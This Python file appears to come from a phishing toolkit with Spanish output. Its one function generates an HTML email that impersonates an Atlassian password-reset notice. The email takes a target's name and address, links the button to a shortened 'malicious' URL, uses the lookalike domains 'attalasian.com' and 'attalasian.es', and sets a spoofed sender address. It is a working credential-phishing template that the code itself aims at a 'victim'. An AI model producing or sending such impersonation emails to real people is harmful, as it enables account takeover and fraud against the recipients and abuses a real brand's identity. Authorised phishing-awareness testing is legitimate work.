import time
import os
import sys
import smtplib
from helper.helper import get_input_es,saveTemplateGenerated,urlShorter

def atlassian_es():
    
    userName,url,userEmail,currentDate=get_input_es()
    print("\nGenerando suplantanción atalassian...")
    print("\nLos datos de la victima usados para este ataque:\n[Usuario]:"+userName+"\n[Email]:"+userEmail)
    urlShort=urlShorter(url+userName)
    print("\n[Url Maliciosa]:"+url+userName+"\n[Url Acortada]:"+urlShort)
    
    ##HTML que se enviara a la victima
    atalasianHtml=("""
                   <div class="maincontent">
    <tbody>
      <tr>
        <td colspan="2">
          <table width="100%" cellpadding="12" cellspacing="0" border="0">
            <tbody>
              <tr>
                <td>
                  <div style="overflow: hidden">
                    <font size="-1"
                      ><u></u>
                      <div
                        style="
                          margin: 0;
                          padding: 0;
                          font-family: -apple-system, BlinkMacSystemFont,
                            Segoe UI, Roboto, Oxygen, Ubuntu, Fira Sans,
                            Droid Sans, Helvetica Neue, sans-serif;
                          font-size: 14px;
                          font-weight: 400;
                          letter-spacing: -0.005em;
                          color: #091e42;
                          line-height: 20px;
                          background: #ffffff;
                          height: 100%;
                          width: 100%;
                        "
                      >
                        <table
                          width="100%"
                          border="0"
                          cellspacing="0"
                          cellpadding="0"
                          style="border-collapse: collapse"
                        >
                          <tbody>
                            <tr>
                              <td align="center">
                                <div style="max-width: 520px; margin: 0 auto">
                                  <div
                                    style="
                                      vertical-align: top;
                                      text-align: left;
                                      font-family: -apple-system,
                                        BlinkMacSystemFont, Segoe UI, Roboto,
                                        Oxygen, Ubuntu, Fira Sans, Droid Sans,
                                        Helvetica Neue, sans-serif;
                                      font-size: 14px;
                                      font-weight: 400;
                                      letter-spacing: -0.005em;
                                      color: #091e42;
                                      line-height: 20px;
                                    "
                                  >
                                    <div
                                      style="
                                        padding-top: 30px;
                                        padding-bottom: 20px;
                                        vertical-align: top;
                                        text-align: center;
                                      "
                                    >
                                      <a
                                        href="https://www.attalasian.com"
                                        target="_blank"
                                        data-saferedirecturl="https://www.attalasian.com"
                                        ><img
                                          src="https://s3testbucketganoro.s3.eu-west-1.amazonaws.com/image/atlassian.png"
                                          height="30"
                                          alt="Atlassian"
                                          style="
                                            line-height: 100%;
                                            outline: none;
                                            text-decoration: none;
                                            border: 0px;
                                            filter: invert(0);
                                          "
                                      /></a>
                                    </div>
                                    <hr
                                      style="
                                        margin-top: 24px;
                                        margin-bottom: 24px;
                                        border: 0;
                                        border-bottom: 1px solid #c1c7d0;
                                      "
                                    />
                                    <table
                                      width="100%"
                                      border="0"
                                      cellspacing="0"
                                      cellpadding="0"
                                      style="border-collapse: collapse"
                                    >
                                      <tbody>
                                        <tr>
                                          <td align="center">
                                            <img
                                              src="https://ci3.googleusercontent.com/meips/ADKq_NbpMMFqVi5tm5CYGs09iCodBybQn5XOrIqo7OBYG2ziU88GBH3yuWVNWpqVza_CprxKcOgjhCX-RcABOWvK9YkH9uMi_oW4jVYtxVqfRi_2buB7KI6iqnkDSh1M9yqArbStd1WW5GlDReF4tw=s0-d-e1-ft#https://id-mail-assets.atlassian.com/template/aid_signup_welcome_verify_adg/people.png"
                                              height="175"
                                              border="0"
                                              alt=""
                                              style="
                                                border: 0px;
                                                line-height: 100%;
                                                outline: none;
                                                text-decoration: none;
                                                filter: invert(0);
                                              "
                                            />
                                          </td>
                                        </tr>
                                      </tbody>
                                    </table>
                                    <p
                                      style="
                                        font-family: -apple-system,
                                          BlinkMacSystemFont, Segoe UI, Roboto,
                                          Oxygen, Ubuntu, Fira Sans, Droid Sans,
                                          Helvetica Neue, sans-serif;
                                        font-size: 14px;
                                        font-weight: 400;
                                        letter-spacing: -0.005em;
                                        color: #091e42;
                                        line-height: 20px;
                                        margin-top: 12px;
                                      "
                                    >
                                      Hola, {}:
                                    </p>
                                    <p
                                      style="
                                        font-family: -apple-system,
                                          BlinkMacSystemFont, Segoe UI, Roboto,
                                          Oxygen, Ubuntu, Fira Sans, Droid Sans,
                                          Helvetica Neue, sans-serif;
                                        font-size: 14px;
                                        font-weight: 400;
                                        letter-spacing: -0.005em;
                                        color: #091e42;
                                        line-height: 20px;
                                        margin-top: 12px;
                                      "
                                    >
                                      Hemos recibido una solicitud para
                                      establecer una nueva contraseña para esta
                                      cuenta de Atlassian:
                                      <b
                                        ><a
                                          style="
                                            text-decoration: none;
                                            color: inherit;
                                          "
                                          >{}</a
                                        ></b
                                      >.
                                    </p>
                                    <div
                                      style="
                                        margin-top: 24px;
                                        margin-bottom: 24px;
                                      "
                                    >
                                      <a
                                        href="{}/{}"
                                        style="
                                          box-sizing: border-box;
                                          border-radius: 3px;
                                          border-width: 0;
                                          border: none;
                                          display: inline-flex;
                                          font-style: normal;
                                          font-size: inherit;
                                          line-height: 24px;
                                          margin: 0;
                                          outline: none;
                                          padding: 4px 12px;
                                          text-align: center;
                                          vertical-align: middle;
                                          white-space: nowrap;
                                          text-decoration: none;
                                          background: #0052cc;
                                          color: #ffffff;
                                        "
                                        target="_blank"
                                        data-saferedirecturl="{}/{}"
                                        >Establecer contraseña</a
                                      >
                                    </div>
                                    <p
                                      style="
                                        font-family: -apple-system,
                                          BlinkMacSystemFont, Segoe UI, Roboto,
                                          Oxygen, Ubuntu, Fira Sans, Droid Sans,
                                          Helvetica Neue, sans-serif;
                                        font-size: 14px;
                                        font-weight: 400;
                                        letter-spacing: -0.005em;
                                        color: #091e42;
                                        line-height: 20px;
                                        margin-top: 12px;
                                      "
                                    >
                                      <span style="color: #5e6c84"
                                        >Si no lo has solicitado, simplemente
                                        ignora este correo electrónico.</span
                                      >
                                    </p>
                                    <hr
                                      style="
                                        margin-top: 24px;
                                        margin-bottom: 24px;
                                        border: 0;
                                        border-bottom: 1px solid #c1c7d0;
                                      "
                                    />
                                    <div
                                      style="
                                        color: #707070;
                                        font-size: 13px;
                                        line-height: 19px;
                                        text-align: center;
                                        margin-top: 10px;
                                      "
                                    >
                                      <table
                                        width="100%"
                                        cellpadding="0"
                                        cellspacing="0"
                                        border="0"
                                        bgcolor="#ffffff"
                                        align="center"
                                        style="border-collapse: collapse"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              valign="top"
                                              align="center"
                                              style="
                                                padding-top: 10px;
                                                line-height: 18px;
                                                text-align: center;
                                                font-weight: none;
                                                font-size: 12px;
                                                color: #505f79;
                                              "
                                            >
                                              <span
                                                >Has recibido este mensaje de
                                                parte de Atlassian Cloud</span
                                              ><br />
                                            </td>
                                          </tr>
                                          <tr valign="top">
                                            <td
                                              align="center"
                                              style="
                                                padding-top: 15px;
                                                padding-bottom: 30px;
                                              "
                                            >
                                              <a
                                                href="https://www.attalasian.es"
                                                target="_blank"
                                                data-saferedirecturl="https://www.attalasian.com"
                                                ><img
                                                  src="https://s3testbucketganoro.s3.eu-west-1.amazonaws.com/image/atlassian.png"
                                                  width="114"
                                                  border="0"
                                                  alt="Atlassian"
                                                  style="
                                                    border: 0px;
                                                    line-height: 100%;
                                                    outline: none;
                                                    text-decoration: none;
                                                    display: block;
                                                    color: rgb(76, 154, 201);
                                                    filter: invert(0);
                                                  "
                                              /></a>
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </div>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          </tbody>
                        </table></div
                    ></font>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </td>
      </tr>
    </tbody>
  </table>
</div>
                   """.format(userName,userEmail,urlShort,userName,urlShort,userName))
    saveTemplateGenerated(userName,"Attalasian",atalasianHtml,"Recuperación de tu cuenta Attalassian", "notificaciones@movicoders.link",userEmail)
